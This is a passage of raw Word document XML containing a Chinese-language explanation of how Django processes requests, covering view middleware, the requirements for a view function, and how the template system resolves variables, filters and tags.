        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequst</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view function</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，针对这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的位置参数列表和关键字参数字典。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4CFA6A"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Apply view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472FC232"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for middleware_method in </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>_view_middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E39E49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response = middleware_method(request, callback, callback_args, callback_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0321F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if response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393AC18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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1FCFE8"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lastRenderedPageBreak/>
        <w:t>还有，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">middleware </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>有可能介入这一阶段并强迫处理器立即返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4577CC06"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5" w:name="sec12"/>
      <w:bookmarkEnd w:id="65"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>进入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FDAECB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如果处理过程这时候还在继续的话，处理器会调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> view function</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中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Views </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>不很严格因为它只需要满足几个条件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB880A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必须可以被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2C3B6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必须接受</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的实例作为第一位值参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F04CE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必须能产生一个异常或返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的一个实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C38D1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除了这些，你就可以天马行空了。尽管如此，一般来说，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">views </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>会使用</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database API </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>来创建，检索，更新和删除数据库的某些东西，还会加载并渲</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染一个模板来呈现一些东西给最终用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760799C4"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6" w:name="sec13"/>
      <w:bookmarkEnd w:id="66"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>模板</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA2F74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的模板系统有两个部分：一部分是给设计师使用的混入少量其它东西的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，另一部分是给程序员使用纯</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F4469D"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从一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTML </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>作者的角度，</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的模板系统非常简单，需要知道的仅有三个结构：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6045D23F"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变量引用。在模板中是这样：</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> {{ foo }}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719F933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模板过滤。在上面的例子中使用过滤竖线是这样：</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>{{ foo|bar }}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。通常这</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用来格式化输出（比如：运行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Textile</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，格式化日期等等）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DFF7D5"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模板标签。是这样：</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>{% baz %}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。这是模板的</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逻辑</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实现的地方，你可以</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> {% if foo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for bar in foo %}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，等等，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">if </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 xml:space="preserve"> for </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>都是模板标签。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58335F4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变量引用以一种非常简单的方式工作。如果你只是要打印变量，只要</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> {{ foo }}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，模板系统就会输出它。这里唯一的复杂情况是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> {{ foo.bar }}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，这时模板系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统按顺序尝试几件事：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D9EEE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首先它尝试一个字典方式的查找，看看</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo[‘bar’] </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>是否存在。如果存在，</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则它的值被输出，这个过程也随之结束。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AF90F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如果字典查找失败，模板系统尝试属性查找，看看</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo.bar </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>是否存在。同</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时它还检查这个属性是否可以被调用，如果可以，调用之。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E58A37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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>如果属性查找失败，模板系统尝试把它作为列表索引进行查找。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59845A0F"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如果所有这些都失败了，模板系统输出配置</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> TEMPLATE_STRING_IF_INVALID </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的值，默认是空字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457FCA1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模板过滤就是简单的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python functions</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，它接受一个值和一个参数，返回一个新的值。比如，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">date </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>过滤用一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python datetime </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>对象作为它的值，一个标准的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> strftime </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>格式化字符串作为它的参数，返回对</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> datetime </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>对象应用了格式化字符</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串之后的结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5278A9A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模板标签用在事情有一点点复杂的地方，它是你了解</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的模板系统是如何</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真正工作的地方。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A102DB9"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67" w:name="sec14"/>
      <w:bookmarkEnd w:id="67"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>模板的结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B700CD"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在内部，一个</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模板体现为一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> “nodes” </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>集合，它们都是从基本的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.template.Node </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>类继承而来。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
